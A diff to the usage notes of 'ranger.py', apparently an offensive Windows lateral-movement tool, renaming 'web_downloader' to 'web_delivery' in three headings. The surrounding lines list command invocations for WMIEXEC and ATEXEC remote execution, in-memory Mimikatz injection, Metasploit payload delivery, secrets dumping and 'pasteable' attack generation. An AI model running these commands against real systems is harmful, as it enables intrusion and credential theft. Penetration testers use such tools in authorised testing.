@@ -37,7 +37,7 @@ ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec -c
 ###WMIEXEC PowerShell Mimikatz Memory Injector:
 ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --invoker
 
-###WMIEXEC Metasploit web_downloader Memory Injector:
+###WMIEXEC Metasploit web_delivery Memory Injector:
 ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --downloader
 
 ###WMIEXEC Custom Code Memory Injector:
@@ -49,7 +49,7 @@ ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --atexec -c 
 ###ATEXEC PowerShell Mimikatz Memory Injector:
 ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --invoker --no-encoder
 
-###ATEXEC Metasploit web_downloader Memory Injector:
+###ATEXEC Metasploit web_delivery Memory Injector:
 ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --downloader --no-encoder
 
 ###ATEXEC Custom Code Memory Injector:
@@ -61,7 +61,7 @@ ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --secrets-du
 ###Create Pasteable Mimikatz Attack:
 ranger.py --invoker -q -v -vv -vvv
 
-###Create Pasteable web_downloader Attack:
+###Create Pasteable web_delivery Attack:
 ranger.py --downloader -q -v -vv -vvv
 
 ###Create Pasteable Executor Attack:
